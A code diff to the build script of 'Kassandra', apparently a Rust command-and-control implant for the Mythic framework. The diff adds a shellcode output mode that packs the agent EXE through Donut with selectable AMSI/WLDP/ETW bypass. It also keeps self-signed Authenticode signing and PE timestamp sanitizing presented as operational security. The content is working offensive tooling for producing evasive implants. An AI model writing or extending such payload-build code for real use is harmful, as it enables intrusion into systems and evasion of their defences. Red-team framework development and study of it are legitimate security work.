@@ -28,6 +28,9 @@ class KassandraAgent(PayloadType):
     note = """Basic Implant in Rust"""                                   # Description
     supports_dynamic_loading = False                                  # Support of dynamic code loading
     c2_profiles = ["http", "s3_storage", "tailscale"]                  # Listener types
+    # Donut shellcode format / AMSI bypass choices (same ordering as Apollo / donut -f / -b).
+    shellcode_format_options = ["Binary", "Base64", "C", "Ruby", "Python", "Powershell", "C#", "Hex"]
+    shellcode_bypass_options = ["None", "Abort on fail", "Continue on fail"]
     c2_parameter_deviations = {
         "s3_storage": {
             "encrypted_exchange_check": C2ParameterDeviation(supported=False),
@@ -42,9 +45,41 @@ class KassandraAgent(PayloadType):
         BuildParameter(
             name="output",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Choose output format",
-            choices=["exe", "dll"],
-            default_value="exe"
+            description="Choose output format. Shellcode converts the compiled EXE through Donut (PIC).",
+            choices=["exe", "dll", "shellcode"],
+            default_value="exe",
+            ui_position=1,
+        ),
+        BuildParameter(
+            name="shellcode_format",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=shellcode_format_options,
+            default_value="Binary",
+            description="Donut shellcode format options.",
+            group_name="Shellcode Options",
+            hide_conditions=[
+                HideCondition(name="output", operand=HideConditionOperand.NotEQ, value="shellcode")
+            ],
+            ui_position=2,
+        ),
+        BuildParameter(
+            name="shellcode_bypass",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=shellcode_bypass_options,
+            default_value="Continue on fail",
+            description="Donut AMSI/WLDP/ETW bypass behavior.",
+            group_name="Shellcode Options",
+            hide_conditions=[
+                HideCondition(name="output", operand=HideConditionOperand.NotEQ, value="shellcode")
+            ],
+            ui_position=3,
+        ),
+        BuildParameter(
+            name="adjust_filename",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=True,
+            description="Automatically adjust payload extension based on selected output (e.g. .bin for shellcode Binary).",
+            ui_position=4,
         ),
         BuildParameter(
             name="chunk_size",
@@ -103,6 +138,7 @@ class KassandraAgent(PayloadType):
         BuildStep(step_name="Compiling", step_description="Compiling the agent"),
         BuildStep(step_name="Signing", step_description="Self-signed Authenticode via osslsigncode"),
         BuildStep(step_name="PE OPSEC", step_description="Sanitize PE timestamps and audit OPSEC metadata"),
+        BuildStep(step_name="Donut", step_description="Converting EXE to position-independent shellcode via Donut"),
     ]
 
     async def build(self) -> BuildResponse:
@@ -339,6 +375,9 @@ class KassandraAgent(PayloadType):
             StepSuccess=True
         ))
         output_format = self.get_parameter("output")
+        # Shellcode is always produced from a PE EXE (Donut loads the EXE entry point).
+        build_as_dll = output_format == "dll"
+        want_shellcode = output_format == "shellcode"
 
         rustUpCommand = "rustup +nightly target add x86_64-pc-windows-gnu"
         proc = await asyncio.create_subprocess_shell(
@@ -349,7 +388,7 @@ class KassandraAgent(PayloadType):
         await proc.communicate()
 
         src_path = pathlib.Path(agent_build_path.name) / "kassandra" / "src"
-        if output_format == "dll":
+        if build_as_dll:
             # Remove main.rs so cargo only sees the lib target
             (src_path / "main.rs").unlink(missing_ok=True)
             # Add [lib] section to Cargo.toml for cdylib output
@@ -374,7 +413,7 @@ class KassandraAgent(PayloadType):
             features.append("debug_log")
         features_flag = f"--features {','.join(features)}" if features else ""
 
-        if output_format == "dll":
+        if build_as_dll:
             build_command = f"cargo {toolchain} build --release --lib {target} {manifest} {features_flag}"
             filename = f"{agent_build_path.name}/kassandra/target/x86_64-pc-windows-gnu/release/kassandra.dll"
         else:
@@ -418,58 +457,85 @@ class KassandraAgent(PayloadType):
             StepSuccess=True
         ))
 
-        # --- Signing (must not silently fail) ---
-        if not shutil.which("osslsigncode"):
-            msg = (
-                "osslsigncode not found on PATH. "
-                "Image is missing a required build tool (often a stale BinaryFiller-era image). "
-                "Rebuild the kassandra container from current Dockerfile or apt-install osslsigncode."
-            )
+        # --- Signing ---
+        # Authenticode is for on-disk PE delivery. Shellcode packs the PE via Donut;
+        # a cert only bloats the intermediate object and has no runtime meaning.
+        if want_shellcode:
+            try:
+                pre_actions = sanitize_pe_timestamps(filename)
+            except Exception as e:
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="Signing",
+                    StepStdout=f"PE timestamp sanitize failed: {e}",
+                    StepSuccess=False,
+                ))
+                resp.status = BuildStatus.Error
+                resp.build_message = f"PE timestamp sanitize failed: {e}"
+                return resp
+            newName = filename
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
                 StepName="Signing",
-                StepStdout=msg,
-                StepSuccess=False,
+                StepStdout=(
+                    "Skipped Authenticode (shellcode output).\n"
+                    f"pre-donut PE sanitize: {pre_actions or ['no changes']}"
+                ),
+                StepSuccess=True,
             ))
-            resp.status = BuildStatus.Error
-            resp.build_message = msg
-            return resp
-
-        if output_format == "dll":
-            newName = filename.replace("kassandra.dll", "kassandraSigned.dll")
         else:
-            newName = filename.replace("kassandra.exe", "kassandraSigned.exe")
+            if not shutil.which("osslsigncode"):
+                msg = (
+                    "osslsigncode not found on PATH. "
+                    "Image is missing a required build tool (often a stale BinaryFiller-era image). "
+                    "Rebuild the kassandra container from current Dockerfile or apt-install osslsigncode."
+                )
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="Signing",
+                    StepStdout=msg,
+                    StepSuccess=False,
+                ))
+                resp.status = BuildStatus.Error
+                resp.build_message = msg
+                return resp
 
-        try:
-            # Pre-sign: zero timestamps so the on-disk object is already neutral.
-            pre_actions = sanitize_pe_timestamps(filename)
-            pfx_path = generate_self_signed_cert()
-            sign_with_osslsigncode(filename, newName, pfx_path, "infected")
-            # Post-sign: osslsigncode / openssl may rewrite headers — re-neutralize.
-            post_actions = sanitize_pe_timestamps(newName)
-        except Exception as e:
+            if build_as_dll:
+                newName = filename.replace("kassandra.dll", "kassandraSigned.dll")
+            else:
+                newName = filename.replace("kassandra.exe", "kassandraSigned.exe")
+
+            try:
+                # Pre-sign: zero timestamps so the on-disk object is already neutral.
+                pre_actions = sanitize_pe_timestamps(filename)
+                pfx_path = generate_self_signed_cert()
+                sign_with_osslsigncode(filename, newName, pfx_path, "infected")
+                # Post-sign: osslsigncode / openssl may rewrite headers — re-neutralize.
+                post_actions = sanitize_pe_timestamps(newName)
+            except Exception as e:
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="Signing",
+                    StepStdout=f"Signing failed: {e}",
+                    StepSuccess=False,
+                ))
+                resp.status = BuildStatus.Error
+                resp.build_message = f"Signing failed: {e}"
+                return resp
+
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
                 StepName="Signing",
-                StepStdout=f"Signing failed: {e}",
-                StepSuccess=False,
+                StepStdout=(
+                    "Signed with self-signed cert (osslsigncode).\n"
+                    f"pre-sign sanitize: {pre_actions or ['no changes']}\n"
+                    f"post-sign sanitize: {post_actions or ['no changes']}"
+                ),
+                StepSuccess=True,
             ))
-            resp.status = BuildStatus.Error
-            resp.build_message = f"Signing failed: {e}"
-            return resp
-
-        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-            PayloadUUID=self.uuid,
-            StepName="Signing",
-            StepStdout=(
-                "Signed with self-signed cert (osslsigncode).\n"
-                f"pre-sign sanitize: {pre_actions or ['no changes']}\n"
-                f"post-sign sanitize: {post_actions or ['no changes']}"
-            ),
-            StepSuccess=True,
-        ))
 
         # --- PE OPSEC audit (fail closed on pipeline-owned issues) ---
+        # For shellcode this audits the intermediate EXE before Donut packs it.
         require_gui = bool(self.get_parameter("no_console"))
         report = audit_pe(newName, require_gui=require_gui)
         audit_text = report.summary()
@@ -494,7 +560,60 @@ class KassandraAgent(PayloadType):
             StepSuccess=True,
         ))
 
+        # --- Donut (shellcode only) ---
+        if want_shellcode:
+            sc_format = self.get_parameter("shellcode_format")
+            sc_bypass = self.get_parameter("shellcode_bypass")
+            try:
+                shellcode_path, donut_cmd, donut_log = await run_donut(
+                    pe_path=newName,
+                    work_dir=agent_build_path.name,
+                    format_name=sc_format,
+                    format_options=self.shellcode_format_options,
+                    bypass_name=sc_bypass,
+                    bypass_options=self.shellcode_bypass_options,
+                )
+            except Exception as e:
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="Donut",
+                    StepStdout=f"Donut failed: {e}",
+                    StepSuccess=False,
+                ))
+                resp.status = BuildStatus.Error
+                resp.build_message = f"Donut failed: {e}"
+                return resp
+
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Donut",
+                StepStdout=f"Successfully converted via Donut:\n{donut_cmd}\n{donut_log}",
+                StepSuccess=True,
+            ))
+            resp.payload = open(shellcode_path, "rb").read()
+            resp.updated_filename = adjust_file_name(
+                self.filename,
+                sc_format,
+                output_format,
+                self.get_parameter("adjust_filename"),
+            )
+            return resp
+
+        # Non-shellcode path: mark Donut step as skipped so the build UI stays green.
+        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+            PayloadUUID=self.uuid,
+            StepName="Donut",
+            StepStdout="Skipped (output is not shellcode).",
+            StepSuccess=True,
+        ))
+
         resp.payload = open(newName, "rb").read()
+        resp.updated_filename = adjust_file_name(
+            self.filename,
+            self.get_parameter("shellcode_format"),
+            output_format,
+            self.get_parameter("adjust_filename"),
+        )
         return resp
 
 
@@ -505,10 +624,129 @@ _DOH_URLS = {
     "google": "https://8.8.8.8/dns-query",
 }
 
+# Preferred install path from the Kassandra Dockerfile; fall back to PATH.
+_DONUT_CANDIDATES = (
+    "/opt/donut/donut",
+    "/usr/local/bin/donut",
+)
+
+
 def _resolve_doh_url(choice, custom_url=""):
     if choice == "custom":
         return custom_url
     return _DOH_URLS.get(choice, "")
+
+
+def _find_donut() -> str:
+    for path in _DONUT_CANDIDATES:
+        if os.path.isfile(path) and os.access(path, os.X_OK):
+            return path
+    which = shutil.which("donut")
+    if which:
+        return which
+    raise FileNotFoundError(
+        "donut binary not found. Expected /opt/donut/donut (install via Dockerfile) "
+        "or donut on PATH. Rebuild the kassandra container."
+    )
+
+
+async def run_donut(
+    pe_path: str,
+    work_dir: str,
+    format_name: str,
+    format_options: list,
+    bypass_name: str,
+    bypass_options: list,
+) -> tuple:
+    """
+    Convert a PE (EXE) to position-independent shellcode with Donut.
+
+    Mirrors Apollo's invocation:
+      donut -x3 -k2 -o loader.bin -i <pe> -fN -bN
+
+    -x3  loader does not exit / cleanup (agent main is a long-running loop)
+    -k2  randomize module names (entropy without full PE encryption)
+    -fN  output format (1=Binary … 8=Hex)
+    -bN  AMSI/WLDP/ETW bypass (1=None, 2=Abort on fail, 3=Continue on fail)
+    """
+    donut_path = _find_donut()
+    # Ensure execute bit (image layers sometimes drop it).
+    os.chmod(donut_path, 0o755)
+
+    try:
+        format_idx = format_options.index(format_name) + 1
+    except ValueError as e:
+        raise ValueError(f"Unknown shellcode_format {format_name!r}") from e
+    try:
+        bypass_idx = bypass_options.index(bypass_name) + 1
+    except ValueError as e:
+        raise ValueError(f"Unknown shellcode_bypass {bypass_name!r}") from e
+
+    out_name = "loader.bin"
+    shellcode_path = os.path.join(work_dir, out_name)
+    # Absolute -i path so cwd can be the temp build dir (matches Apollo).
+    pe_abs = os.path.abspath(pe_path)
+    argv = [
+        donut_path,
+        "-x3",
+        "-k2",
+        "-o", out_name,
+        "-i", pe_abs,
+        f"-f{format_idx}",
+        f"-b{bypass_idx}",
+    ]
+    cmd_display = " ".join(argv)
+
+    proc = await asyncio.create_subprocess_exec(
+        *argv,
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE,
+        cwd=work_dir,
+    )
+    stdout, stderr = await proc.communicate()
+    log = f"[stdout]\n{stdout.decode(errors='replace')}\n[stderr]\n{stderr.decode(errors='replace')}"
+
+    if proc.returncode != 0:
+        raise RuntimeError(
+            f"donut exited {proc.returncode}\nCommand: {cmd_display}\n{log}"
+        )
+    if not os.path.isfile(shellcode_path):
+        raise RuntimeError(
+            f"donut succeeded but output missing: {shellcode_path}\nCommand: {cmd_display}\n{log}"
+        )
+    if os.path.getsize(shellcode_path) == 0:
+        raise RuntimeError(f"donut produced empty shellcode at {shellcode_path}\n{log}")
+
+    return shellcode_path, cmd_display, log
+
+
+def adjust_file_name(filename, shellcode_format, output_type, adjust_filename):
+    """Mirror Apollo: rewrite the download extension for the selected output."""
+    if not adjust_filename:
+        return filename
+    if not filename:
+        return filename
+    pieces = filename.rsplit(".", 1)
+    original = pieces[0] if len(pieces) == 2 else filename
+
+    if output_type == "exe":
+        return original + ".exe"
+    if output_type == "dll":
+        return original + ".dll"
+    if output_type != "shellcode":
+        return filename
+
+    ext_map = {
+        "Binary": ".bin",
+        "Base64": ".txt",
+        "C": ".c",
+        "Ruby": ".rb",
+        "Python": ".py",
+        "Powershell": ".ps1",
+        "C#": ".cs",
+        "Hex": ".txt",
+    }
+    return original + ext_map.get(shellcode_format, ".bin")
 
 
 def generate_self_signed_cert(name="mycodecert", password="infected"):
